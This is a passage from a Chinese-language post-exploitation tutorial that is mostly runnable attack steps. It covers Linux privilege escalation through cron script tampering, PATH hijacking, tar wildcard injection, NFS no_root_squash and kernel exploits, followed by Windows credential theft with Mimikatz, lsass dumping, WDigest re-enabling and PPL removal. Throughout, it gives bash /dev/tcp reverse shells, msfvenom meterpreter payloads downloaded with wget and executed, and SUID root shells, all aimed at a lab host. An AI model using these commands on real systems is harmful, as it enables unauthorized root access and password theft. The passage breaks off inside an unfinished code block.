| +----------- 小时 (0 - 23)
+------------- 分钟 (0 - 59)
```

###  4.1.计划任务文件提权


当计划任务脚本文件配置不当，导致任何人对于计划任务脚本文件都具有写权限时，我们可以通过修改计划任务脚本文件来进行提权。

#### 查看计划任务

执行下方命令查看系统范围内的计划任务作业，发现存在以 **root 权限执行的 overwrite.sh 脚本**。

```python
cat /etc/crontab
```

![image-20241010183749084](https://image.201068.xyz/assets/38.后渗透/image-20241010183749084.png)

#### 查找文件位置，查看权限

执行下方命令查找 `overwrite.sh` **文件所在位置**，并**查看该文件权限配置**，发现该文件**任何人可写**

```python
find / -name overwrite.sh 2>/dev/null
ll /usr/local/bin/overwrite.sh
```

![image-20241010183831620](https://image.201068.xyz/assets/38.后渗透/image-20241010183831620.png)

#### 插入反弹 shell 命令

执行下方命令向 overwrite.sh 文件**写入反弹 shell 命令**

```python
echo 'bash -i >& /dev/tcp/192.168.70.4/6666 0>&1' >> /usr/local/bin/overwrite.sh
```

![image-20241010183900245](https://image.201068.xyz/assets/38.后渗透/image-20241010183900245.png)

#### 监听端口

然后再接收 shell 的服务器执行下方命令监听端口，等待计划任务执行后即可获得 root 权限的 shell

```python
nc -lvnp 6666
```

![image-20241010184033498](https://image.201068.xyz/assets/38.后渗透/image-20241010184033498.png)

### 4.2.计划任务PATH环境变量提权

当计划任务配置不当，在运行脚本时没有使用绝对路径，且 PATH 环境变量存在低权限用户也可写入的路径，

导致攻击者可以在 PATH 环境变量指定的路径中写入伪造的计划任务脚本来进行提权。

#### 查看计划任务

执行下方命令查看系统范围内的计划任务作业。

```python
cat /etc/crontab
```

![image-20241010184305469](https://image.201068.xyz/assets/38.后渗透/image-20241010184305469.png)

发现存在以 root 权限执行的 `overwrite.sh` 脚本，且该文件写的是**相对路径**执行。

而我们对于 `/etc/cron` 文件中指定的 `PATH` 路径中的 `/home/ubuntu` 目录具有**写入权限**

![image-20241010184512513](https://image.201068.xyz/assets/38.后渗透/image-20241010184512513.png)

#### 新建文件

> 利用path路径从左往右查找的特性

所以我们可以在 `/home/ubuntu` 目录中新建一个 `overwrite.sh` 文件，里面写入我们的提权脚本即可。


```bash
vim /home/ubuntu/overwrite.sh

#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

![image-20241010184730129](https://image.201068.xyz/assets/38.后渗透/image-20241010184730129.png)

#### 运行

```bash
chmod +x /home/ubuntu/overwrite.sh
/tmp/rootbash -p
```

**等待一分钟**计划任务后

执行命令即可获得 `root` 权限

![image-20241010184905097](https://image.201068.xyz/assets/38.后渗透/image-20241010184905097.png)

### 4.3.计划任务+通配符提权

#### Wildcard wildness简介

`Wildcard wildness` 简称 `WS` ，接下来通过实验理解什么是 WS 。

##### 创建文件

首先，我们创建下列文件

```python
mkdir test
cd test
echo "a" > a.txt
echo "b" > b.txt
echo "c" > ./--help
```

##### 查看创建的文件

```python
cat a.txt
cat b.txt
cat --help
ls *
```

查看刚才创建的文件，发现查看 `a.txt` 和 `b.txt` 时一切正常

![image-20241010190251310](https://image.201068.xyz/assets/38.后渗透/image-20241010190251310.png)

但查看 `--help` 文件时发现**直接调出了 cat 命令的帮助手册**

![image-20241010190318987](https://image.201068.xyz/assets/38.后渗透/image-20241010190318987.png)

此时如果我们执行 `ls *` ，会发现执行的结果也是 `ls --help` 的结果。

![image-20241010190410100](https://image.201068.xyz/assets/38.后渗透/image-20241010190410100.png)

这种技巧就是 `Wildcard wildness` 。

如果此时有处在**高权限运行的命令的参数**中可以去执行其他 Linux 命令，我们**进行劫持**，就可以达到提权的目的。

#### tar参数劫持

在这里我们以 `tar` 命令为例进行演示。

##### 需要的效果


tar命令**支持使用通配符**进行打包，且 tar 中有执行 `linux` 命令的**参数**

```python
tar -czf test.tar a.txt --checkpoint=1 --checkpoint-action=exec=whoami
```

> `--checkpoint=1` :将检查点设置为1
>
> `--checkpoint-action=exec=whoami` :在检查点执行 whoami 命令

![image-20241010190448742](https://image.201068.xyz/assets/38.后渗透/image-20241010190448742.png)

##### 创建两个以参数作为文件名的文件

我们可以对参数进行劫持，只需要执行下列这样的命令，**创建两个以参数作为文件名的文件**即可

```python
echo "">./--checkpoint=1
echo "">./--checkpoint-action=exec=whoami
```

![image-20241010190535712](https://image.201068.xyz/assets/38.后渗透/image-20241010190535712.png)

##### 删除干扰文件

删除 `--help` 文件，防止对我们造成干扰

```python
rm ./--help
```

![image-20241010190630303](https://image.201068.xyz/assets/38.后渗透/image-20241010190630303.png)

##### 查看效果

执行下列命令查看效果，发现成功输出 `whoami` 命令的结果

```python
tar cvf test.tar *
```

![image-20241010190701048](https://image.201068.xyz/assets/38.后渗透/image-20241010190701048.png)

#### 提权操作

##### 查看计划任务

执行下列命令**查看计划任务**，发现有一个以 **root 权限**运行 `/usr/bin/backup.sh` 文件的计划任务

```python
cat /etc/crontab
```

![image-20241011105543035](https://image.201068.xyz/assets/38.后渗透/image-20241011105543035.png)

##### 查看backup.sh文件内容

执行下列命令查看 `/usr/bin/backup.sh` 文件内容，发现使用 tar 命令打包 `/home/ubuntu` 目录下的所有文件，并且是使用的通配符进行的打包，可以尝试利用提权

```python
cat /usr/bin/backup.sh
```

![image-20241011105618524](https://image.201068.xyz/assets/38.后渗透/image-20241011105618524.png)

> ```python
> #!/bin/sh
> cd /home/ubuntu
> tar czf /tmp/backup.tar.gz *
> ```



##### 创建两个文件

因为 `/usr/bin/backup.sh` 脚本中的内容是切换到 `/home/ubuntu` 目录后，使用 `tar` 命令进行打包，

所以我们应该切换到 `/home/ubuntu` 目录执行下列命令

```python
echo "">./--checkpoint=1
echo "">./--checkpoint-action=exec='bash shell.sh'
```

![image-20241011105741823](https://image.201068.xyz/assets/38.后渗透/image-20241011105741823.png)

##### 新建shell.sh 文件

上述两个文件创建完成后，在相同目录**再新建一个 shell.sh 文件**，文件内写**反弹 shell 的命令**，并**添加可执行权限**。

```python
vim shell.sh

#/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.70.4/8888 0>&1'


chmod +x shell.sh
```

![image-20241011105855412](https://image.201068.xyz/assets/38.后渗透/image-20241011105855412.png)

![image-20241011105918060](https://image.201068.xyz/assets/38.后渗透/image-20241011105918060.png)

##### kali进行监听

然后在 kali 启动监听，等待片刻后即可接收到 shell

```python
nc -lvp 8888  
```

![image-20241011110048992](https://image.201068.xyz/assets/38.后渗透/image-20241011110048992.png)

## 五.NFS提权

网络文件系统（NFS）是一种分布式文件系统协议，允许用户在网络上访问存储在远程计算机上的文件，就像访问本地文件一样。

在Linux和UNIX系统中，NFS是实现**文件共享**的常用方式。

拿到目标初始权限后，如果目标服务器开启了NFS，可以通过 `cat  /etc/exports` 查看详细信息。

在默认情况下，NFS会把 root 用户更改为 `nobody` 用户并**限制以 root 身份执行任何文件**。

如果 `no_root_squash` 选项出现了共享当中，客户端以 `root` 身份执行的操作在NFS服务器上将以root身份运行，

我们可以创建一个恶意的 `SUID` **可执行文件**在上面运行进而提权。

### 查看 NFS 信息

**获得初始权限**后，执行下方命令查看 NFS 信息


```bash
cat /etc/exports
```
![image-20241011113740481](https://image.201068.xyz/assets/38.后渗透/image-20241011113740481.png)

#### 结果解析

```python
/nfsroot *(rw,sync,no_root_squash)
```

> `/nfsroot`：这是要共享的目录的路径。
>
> `*`：这个符号代表允许任何客户端访问这个共享。
>
> `(rw,sync,no_root_squash)`：这部分定义了对共享的**访问权限**和行为，包括三个选项：
>
> `rw`：表示**读写**权限。这允许连接的客户端不仅可以读取共享中的文件，还可以修改它们。
>
> `sync`：指定NFS应该在应答写操作之前将数据同步到磁盘。这是为了确保数据的一致性和可靠性。
>
> `no_root_squash`：如前所述，这意味着从客户端连接到此共享的 root 用户将**保留其 root 权限**，而不是被映射到匿名用户（如nobody）。

### kali创建挂载目录  

在 `kali` 中切换到`root`用户

然后执行下方命令**创建挂载目录**，把 **nfs 共享目录**挂载到创建的目录

```python
mkdir /tmp/nfs
mount -o rw,vers=3 192.168.70.29:/nfsroot /tmp/nfs
```

> `mount`：这是用于挂载文件系统的标准 Linux 命令。
>
> `-o`：表示后面跟随的是挂载选项。
>
> `rw`：表示以读写模式挂载文件系统。
>
> `vers=3`：指定使用 NFS 版本 3。版本 3 是一种广泛支持的标准，提供了良好的兼容性。
>
> `192.168.70.29:/nfsroot`：这部分指定了要挂载的 NFS 共享。IP 为目标服务器 IP 地址
>
> `/tmp/nfs`：这是本地系统上的挂载点，NFS 共享将在这个目录下被挂载。

![image-20241011113905068](https://image.201068.xyz/assets/38.后渗透/image-20241011113905068.png)

### 生成木马

在 `kali` 中切换到 root 用户执行下方命令

在 `NFS` 共享目录中**生成木马**

然后设置**可执行权限**和 `SUID` 权限 

```python
msfvenom -p linux/x64/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/rootshell.elf
chmod +sx /tmp/nfs/rootshell.elf
```

![image-20241011113941708](https://image.201068.xyz/assets/38.后渗透/image-20241011113941708.png)

### 执行命令

在**初始的 shell** 中执行下方命令即可获得 root 权限

```python
/nfsroot/rootshell.elf
```

![image-20241011114015874](https://image.201068.xyz/assets/38.后渗透/image-20241011114015874.png)

## 六.LINUX内核漏洞提权


内核提权是利用 Linux 内核的漏洞进行提权的，内核漏洞进行提权一般包括三个环节：

1. 1.对目标系统进行信息收集，获取到系统内核信息及版本信息；
2. 2.根据内核版本获取其对应的漏洞以及EXP
3. 3.使用找到的EXP对目标系统发起攻击，完成提权操作

### 查看Linux内核版本

查看Linux操作系统的内核版本和相关信息   

```python
cat /etc/issue 			 #查看ubuntu或者centos的版本
cat /etc/*-release 		 #查看centos版本
uname -a 				#查看系统全部信息
uname -r 				#查看内核版本
```

![image-20241011135714953](https://image.201068.xyz/assets/38.后渗透/image-20241011135714953.png)

![image-20241011135733953](https://image.201068.xyz/assets/38.后渗透/image-20241011135733953.png)

![image-20241011135751057](https://image.201068.xyz/assets/38.后渗透/image-20241011135751057.png)

![image-20241011135828404](https://image.201068.xyz/assets/38.后渗透/image-20241011135828404.png)

### 寻找EXP

#### searchsploit

EXP可以用 `Kali` 去寻找，Kali 中自带 `searchsploit` 命令可以查找 EXP，输入**对应的版本号**就可以**查找相应的漏洞**

> 3.13.0

```python
searchsploit 3.13.0
```

![image-20241011140149856](https://image.201068.xyz/assets/38.后渗透/image-20241011140149856.png)

#### 获取EXP

输入下列命令就会自动复制该文件到当前目录

```python
searchsploit -m linux/local/37292.c
```

![image-20241011140217003](https://image.201068.xyz/assets/38.后渗透/image-20241011140217003.png)

### 开启 WEB 服务

然后在 `Kali` 执行下方命令开启 WEB 服务

```python
php -S 192.168.70.4:80 -t .
```

![image-20241011140240423](https://image.201068.xyz/assets/38.后渗透/image-20241011140240423.png)

### 下载 EXP 源码

在**反弹的 shell** 中执行下列命令下载 EXP 源码

```python
wget http://192.168.70.4/37292.c
```

![image-20241011140309860](https://image.201068.xyz/assets/38.后渗透/image-20241011140309860.png)

![image-20241011140534574](https://image.201068.xyz/assets/38.后渗透/image-20241011140534574.png)

### 编译EXP 源码

按照 EXP 提示的编译方法**编译**后**运行**即可

```python
gcc 37292.c -o shell
```

![image-20241011140408861](https://image.201068.xyz/assets/38.后渗透/image-20241011140408861.png)

### 运行

```python
./shell
```

![image-20241011140432469](https://image.201068.xyz/assets/38.后渗透/image-20241011140432469.png)

## 七.metasploit linux 提权

`Metasploit`是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。

这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。

团队合作，在Metasploit和综合报告提出了他们的发现。

### 生成木马

**获得初始权限**后

在 Kali 中执行如下命令**生成木马**

```python
cd /root/tools/msf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.70.4 LPORT=8888 -f elf > 8888.elf
```

![image-20241011140715168](https://image.201068.xyz/assets/38.后渗透/image-20241011140715168.png)

### msf 监听

执行下列命令开启 msf 监听模块

```python
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_tcp
set lhost 192.168.70.4
set lport 8888
run
```

![image-20241011140938211](https://image.201068.xyz/assets/38.后渗透/image-20241011140938211.png)

### 开启 WEB 服务

然后在 `Kali` 执行下方命令开启 WEB 服务

> php -S 192.168.70.4:80 -t .

```python
cd /root/tools/msf
php -S 192.168.70.4:80 -t .
```

![image-20241011141223091](https://image.201068.xyz/assets/38.后渗透/image-20241011141223091.png)

### 下载木马文件

在反弹的 shell 中执行下列命令下载木马文件，并赋予可执行权限后执行木马

```python
wget http://192.168.70.4/8888.elf
chmod +x 8888.elf
./8888.elf
```

![image-20241011141308330](https://image.201068.xyz/assets/38.后渗透/image-20241011141308330.png)

![image-20241011141323786](https://image.201068.xyz/assets/38.后渗透/image-20241011141323786.png)

### 查找可利用的漏洞

> run post/multi/recon/local_exploit_suggester

**msf 会话上线**后

执行下方命令查找可利用的漏洞

```python
run post/multi/recon/local_exploit_suggester
```

![image-20241011141538090](https://image.201068.xyz/assets/38.后渗透/image-20241011141538090.png)

| #    | Name                                                       | Check Result                                                 |
| ---- | ---------------------------------------------------------- | ------------------------------------------------------------ |
| 1    | exploit/linux/local/apport_abrt_chroot_priv_esc            | The target appears to be vulnerable.                         |
| 2    | exploit/linux/local/cve_2021_3493_overlayfs                | The target appears to be vulnerable.                         |
| 3    | exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec        | The target is vulnerable.                                    |
| 4    | exploit/linux/local/cve_2022_0995_watch_queue              | The target appears to be vulnerable.                         |
| 5    | exploit/linux/local/network_manager_vpnc_username_priv_esc | The service is running, but could not be validated.          |
| 6    | exploit/linux/local/overlayfs_priv_esc                     | The target appears to be vulnerable.                         |
| 7    | exploit/linux/local/pkexec                                 | The service is running, but could not be validated.          |
| 8    | exploit/linux/local/runc_cwd_priv_esc                      | The target appears to be vulnerable. Vulnerable runc version runc: detected |
| 9    | exploit/linux/local/su_login                               | The target appears to be vulnerable.                         |
| 10   | exploit/linux/local/sudo_baron_samedit                     | The target appears to be vulnerable. sudo 1.8.9.5 is a vulnerable build. |

### 选择提权漏洞

执行完成后将**当前会话挂起**，然后根据刚才的执行结果选择提权漏洞，然后根据提示进行设置即可

```python
background
sessions
use exploit/linux/local/apport_abrt_chroot_priv_esc
show options
set session 1
run
```

![image-20241011142039416](https://image.201068.xyz/assets/38.后渗透/image-20241011142039416.png)

# 用户凭据收集

## 凭据收集简介

在控制目标后，如果要进一步横向渗透以扩大战果，那么通过获取系统上所存的各类凭据信息进行横向或扩展渗透无疑是最好的选择。

获取的凭据信息主要分为本机系统的用户凭据.本机软件的存储凭据与本地存储的其他计算机链接凭据。

本节课大部分操作会使用 `Mimikatz` 来进行，它是一款由法国开发者 Benjamin Delpy开发的凭据操作工具，

下载链接为：https://github.com/gentilkiwi/mimikatz/。

## 一.获取密码和哈希值

Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与 SAM 文件中的密码进行对比，如果相同，则认证成功。

**SAM**文件是位于 `%SystemRoot%\system32\config\` 目录下的，用于储存本地所有用户的凭证信息，但当我们去进行点击的时候我们会发现无法直接查看。

简单来讲本地认证的流程可以分为五步：

>  winlogon.exe ——用户输入账号密码——lsass.exe——转换为Hash之后和SAM文件中的值相比——登录成功或失败

### 1.1 在线获取哈希

SAM 文件中所保存的用户凭据并非明文存储，而是通过 SysKey 加密的。

`SysKey` 又称 **SAM 锁定工具**，其密钥是独一无二的。

使用 SysKey 之后，就算有人获取了SAM文件，他也无法在没有 SysKey 的情况下直接解密出文件中所保存的用户凭据。

`SysKey` 的目的是防止离线式的密码破解。

`SysKey` 主要由 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` 下的 JD.Skew1.GBG 和 Data 键值中的内容组成。

`Mimikatz` 中的`Isadump:sam` 就是通过**读取**当前计算机的 `SysKey` 来**解密 SAM 文件内容**的。操作方式如下。

####  1）开启 debug 权限

在`Mimikatz.exe`中，可以通过执行下方命令来**启用当前进程**的 `SeDebugPrivilege` **特权**。

其中，`privilege` 是 `Mimikatz` 中用于权限调整的模板，debug 则用于指定需要开启的权限。

执行该命令后，`Mimikatz` 将会进行提升权限的操作，不过不是提升当前用户的权限，而是启用当前 `Mimikatz` 进程的调试特权。

启用 debug 权限后，**允许调试系统内其他用户的进程**。

如果返回`Privilege '20' OK﻿ `则代表成功**开启 debug 权限**

如果运行失败，则需要查看当前权限是否被系统 `UAC` 限制

```python
mimikatz privilege::debug
```

![image-20241011170212934](https://image.201068.xyz/assets/38.后渗透/image-20241011170212934.png)

#### 2）伪造 SYSTEM 用户令牌。

如果执行结果中的 SID name 字段显示为 `NT AUTHORITY\SYSTEM`，则代表当前进程已经成功模拟 `SYSTEM` 用户令牌。

这里之所以要获取SYSTEM权限，是因为对注册表中的 `LSA` 项进行操作至少要有 SYSTEM 权限。

```python
mimikatz token::elevate
```

![image-20241011170259719](https://image.201068.xyz/assets/38.后渗透/image-20241011170259719.png)

#### 3）读取SAM文件并解密

成功伪造SYSTEM权限后，在 Mimikatz 中执行下方命令来自动读取 SAM 文件中所保存的加密信息并使用 `SysKey` 解密，

通过解密获取到用户哈希凭据。

```python
lsadump::sam
```

![image-20241011170552538](https://image.201068.xyz/assets/38.后渗透/image-20241011170552538.png)

#### 4）合并为一条命令

> mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

```python
cd C:\Users\h\Desktop\mimikatz 2.1.1\x64
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

![image-20241011171045623](https://image.201068.xyz/assets/38.后渗透/image-20241011171045623.png)

![image-20241011171358464](https://image.201068.xyz/assets/38.后渗透/image-20241011171358464.png)

```python
shell cd C:\Users\h\Desktop\mimikatz 2.1.1\x64&&mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

![shell cd C:\Users\h\Desktop\mimikatz 2.1.1\x64&&mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"](https://image.201068.xyz/assets/38.后渗透/image-20241011171244265.png)

![image-20241011171337021](https://image.201068.xyz/assets/38.后渗透/image-20241011171337021.png)

### 1.2 离线获取哈希

#### 导出注册表

通过注册表获取`SAM`文件

注册表 `HKLM\SAM` 中保存了用户凭据，注册表 `HKLM\SYSTEM` 中保存了能够解密 `SAM` 文件内容的 `SysKey`。

在**主机 `A`** 中使用命令提示符执行命令，以导出注册表`HKLM\SAM与HKLM\SYSTEM`中的内容。

```python
shell reg save HKLM\SAM "C:\Windows\Temp\sam.save"
shell reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

![image-20241011181756850](https://image.201068.xyz/assets/38.后渗透/image-20241011181756850.png)

然后将导出的 `sam.save` 和 `System.save` 文件导入主机 B 中。

![image-20241011181918833](https://image.201068.xyz/assets/38.后渗透/image-20241011181918833.png)

![image-20241011182018741](https://image.201068.xyz/assets/38.后渗透/image-20241011182018741.png)

![image-20241011183815600](https://image.201068.xyz/assets/38.后渗透/image-20241011183815600.png)

![image-20241011184016775](https://image.201068.xyz/assets/38.后渗透/image-20241011184016775.png)

#### Mimikatz解密

在**主机 B** 中使用 Mimikatz 执行如下命令，Mimikatz 会对导出的 `sam.save` 和 `system.save` 两个文件进行解密。

解密成功后将会获取主机 A 上所保存的用户哈希。

```python
mimikatz.exe "privilege::debug" "lsadump::sam /sam:sam.save /system:system.save"
```

![image-20241011184301860](https://image.201068.xyz/assets/38.后渗透/image-20241011184301860.png)

#### samdump2

或者在 `Kali` 中使用自带的解密工具 `samdump2` 执行如下命令

```python
samdump2 system.save sam.save
```

![image-20241011184345735](https://image.201068.xyz/assets/38.后渗透/image-20241011184345735.png)

```python
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
h:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### 1.3 在线读取 lsass 进程内存

Windows 的登录机制为单点登录（SSO），用户只需要输入一次密码就可以使用所有需要身份验证的程序。

实现单点登录的逻辑非常简单，即在用户第一次凭据验证通过之后，将凭据存放在 Lsass.exe（本地安全验证）进程的内存中，

随后当其他进程需要验证用户身份时，该进程将会帮助用户完成认证，所以我们可以从 **Lsass 进程中获取用户凭据**。

#### 获得用户凭据

将 Mimikatz上传到目标主机，执行以下命令即可获得用户凭据：

> mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords full" "exit"

```python
shell C:\Users\h\Desktop\"mimikatz 2.1.1"\x64\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

> `privilege::debug`：提示权限⾄DebugPrivilege权限
>
> `sekurlsa::logonpasswords full`：⽤于导出⽤户凭证

为了防止用户的**明文密码**在**内存**中泄露，微软在2014年5月发布了 KB2871997 补丁，**关闭了 WDigest 功能**，禁止从内存中获取明文密码，

并且 `Windows Server 2012` 及以上版本**默认关闭 WDigest 功能**。

![image-20241011185412604](https://image.201068.xyz/assets/38.后渗透/image-20241011185412604.png)

![image-20241011185448767](https://image.201068.xyz/assets/38.后渗透/image-20241011185448767.png)

#### 开启 WDigest 功能

但是我们可以通过**修改注册表重新开启 WDigest 功能**。

当目标**计算机重启且目标再次输入凭据登录**后，就可以**获取到用户的明文密码**。

```python
#开启 WDigest 功能
shell reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f    

#关闭 WDigest 功能
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

![image-20241011190217410](https://image.201068.xyz/assets/38.后渗透/image-20241011190217410.png)

#### 再次输入凭据登录

**计算机重启**且目标再次**输入凭据登录**

![image-20241011190640151](https://image.201068.xyz/assets/38.后渗透/image-20241011190640151.png)

![image-20241011190424674](https://image.201068.xyz/assets/38.后渗透/image-20241011190424674.png)

![image-20241011190520875](https://image.201068.xyz/assets/38.后渗透/image-20241011190520875.png)

#### 获得用户凭据

```python
shell C:\Users\h\Desktop\"mimikatz 2.1.1"\x64\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

![image-20241011191122322](https://image.201068.xyz/assets/38.后渗透/image-20241011191122322.png)

![image-20241011191148697](https://image.201068.xyz/assets/38.后渗透/image-20241011191148697.png)

### 1.4 离线读取 lsass 内存文件

除了在线读取，也可以将 `lass.exe` 的进程**内存转储**，将内存文件导出到本地后，使用`Mimikatz` 进行**离线读取**。

#### Procdump

在目标主机上传 `Procdump` 程序，执行以下命令，

> Procdump.exe -accepteula -ma lsass.exe lsass.dmp

```python
shell C:\Users\h\Desktop\Procdump\Procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

![image-20241011191929133](https://image.201068.xyz/assets/38.后渗透/image-20241011191929133.png)

#### 将 lsass.exe 的进程转储

![image-20241011192055220](https://image.201068.xyz/assets/38.后渗透/image-20241011192055220.png)

![image-20241011192158145](https://image.201068.xyz/assets/38.后渗透/image-20241011192158145.png)

![image-20241011192322526](https://image.201068.xyz/assets/38.后渗透/image-20241011192322526.png)

#### 导出用户登录凭据

使用 `Mimikatz.exe` **加载内存文件**并**导出里面的用户登录凭据**等信息

```python
Mimikatz.exe "log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" "exit"
```

> `sekurlsa::minidump lsass.dmp`：用于加载内存文件
>
> `sekurlsa::logonpasswords full`：用于导出用户凭证

![image-20241011192440837](https://image.201068.xyz/assets/38.后渗透/image-20241011192440837.png)

### 1.5 绕过 Lsass 进程保护

我们知道攻击者如果想要获取`Windows`凭据，可以读取 `Lsass.exe` **内存空间**或 `SAM` 文件中所**保存的用户哈希**。

在这里我们来简单了解下微软保护 Lsass 进程来防止攻击者从 Lsass 进程中读取凭据的技术，名为`PPL`。

PPL技术的目的并不是保护凭据，而是**防止其他程序越界操作关键进程而导致系统崩溃**。

不过该技术对防止凭据窃取也存在一定效果。

#### PPL 

PPL 全称为 Protected Process Light，该概念是在 Windows 8.1中引入的，最初目的是保护反恶意软件服务，

因为攻击者常常针对**反恶意软件服务**进行**下载病毒**和**更新签名**的操作。

PPL增加了“**等级保护**”（Protection level）的概念，会对不同类型的进程给予**不同等级**的保护。



简单来说，而对于PPL，进程的状态不止**保护**和**不保护**这两种，还包括**进程受保护的等级**。

同时，PPL 会**防止受保护的进程加载未签名的 DLL 文件**。

#### 开启PPL

要打开 PPL，只需要设置相应注册表中的值，然后重启系统即可。

首先以**管理员权限**打开**注册表编辑器**，在`\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` 中新建一个名为 `RunAsPPL` 的 `DWORD`(32位）的值，数据设为`1`。

当`RunAsPPL`的值为`1`时**PPL开启**，设置完成后**系统需要重启**才能生效。

```python
# 开启 LSA 保护策略
shell REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "1" /f

# 关闭 LSA 保护策略
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

![image-20241011195218465](https://image.201068.xyz/assets/38.后渗透/image-20241011195218465.png)

![image-20241011195304225](https://image.201068.xyz/assets/38.后渗透/image-20241011195304225.png)

#### Mimikatz 读取 Lsass 进程

**重启之后**,尝试使用 Mimikatz 读取 Lsass 进程

```python
shell C:\Users\h\Desktop\"mimikatz 2.1.1"\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

会发现 **Mimikatz 无法从 Lsass 进程获取凭据**。

![image-20241011195835330](https://image.201068.xyz/assets/38.后渗透/image-20241011195835330.png)

从上述的开启 PPL 的方式可知，最简单的绕过办法就是**删除注册表的 RunAsPPL 值**，但是**删除 RunAsPPL** 值之后**必须重启系统才能生效**。

接下来我们将使用采用**无需重启的方式来绕过 PPL** 

#### 使用Mimikatz驱动关闭 PPL

如果具备一些逆向工程的知识，就会知道 **Intel x86 处理器**是通过**设置不同的特权级别**来进行**访问控制**的，

级别共分4层：`RING0`,`RING1`,`RING2`,`RING3`。

其中 **RING0 拥有最高的权限，RING3拥有最低的权限**。

为保护系统安全，操作系统在设计之初会限制一定的危险行为；

比如读写一些较为敏感的内存信息，但是依然允许一些特定软件执行必要的危险行为。

例如在 Windows 中有许多程序需要和硬件进行交互，于是出现了驱动程序，而驱动程序拥有 `RING0` 权限。

Mimikatz 也提供了一个驱动程序，该驱动程序可以通将其中 `SignatureLevel.SectionSignatureLevel.Type.Audit` 和 **Signer 的值**修改为 `0` 来强行使PPL失效。

使用时首先要确保 `mimidrv.sys` 和 `Mimikatz.exe` 处于同一根目录下，随后在 Mimikatz 中使用 `!+` 来加载驱动

##### 卸载 Lsass 进程

接着执行下方命令**卸载Lsass进程**的 **PPL 保护**

```python
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

![image-20241011201349658](https://image.201068.xyz/assets/38.后渗透/image-20241011201349658.png)

```python
shell C:\Users\h\Desktop\"mimikatz 2.1.1"\x64\mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "exit"
```

![image-20241011201506458](https://image.201068.xyz/assets/38.后渗透/image-20241011201506458.png)

##### 获得凭据

卸载成功后即可获取到凭据

```python
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

![image-20241011201908388](https://image.201068.xyz/assets/38.后渗透/image-20241011201908388.png)

```python
shell C:\Users\h\Desktop\"mimikatz 2.1.1"\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

![image-20241011201651553](https://image.201068.xyz/assets/38.后渗透/image-20241011201651553.png)

## 二.获取常见应用软件凭据

> 注意：`%USERPROFILE%`为环境变量，使用时如果是**system权限**可以把 `%USERPROFILE%` 替换为**绝对路径**或者**窃取其他用户**的**令牌**进行操作

参考：https://www.sohu.com/a/508495389_121146184

### 2.1.获取 RDP 保存的凭据

为了避免每次连接服务器都进行身份验证，经常使用 **RDP 远程桌面**连接远程服务器的用户可能勾选保存连接凭证，以便进行快速的身份验证。

这些凭证都使用数据保护 `API` 以**加密形式存储**在 Windows 的凭据管理器中，

路径为 `%USERPROFILE%\AppData\Local\Microsoft\Credentials` 

#### 查看保存所有连接凭据

执行以下命令，可以查看当前主机上保存的所有连接凭据。

```python
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" #查看本机链接过哪些机器
cmdkey /list     															#查看当前保存的凭据
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials            			#遍历 Credentials 目录下保存的凭据
```

![image-20241011202534655](https://image.201068.xyz/assets/38.后渗透/image-20241011202534655.png)

> C1860B99FE8CC9874482F01B9EF75CC2
>
> DFBE70A7E5CC19A398EBF1B96859CE5D
>
> E3DAF49B16DF48A0B2CEAB56984CF6E3

#### 导出RDP 连接凭据

尝试使用 `Mimikatz` **导出**指定的 **RDP 连接凭据**，

首先，执行下列命令：

```python
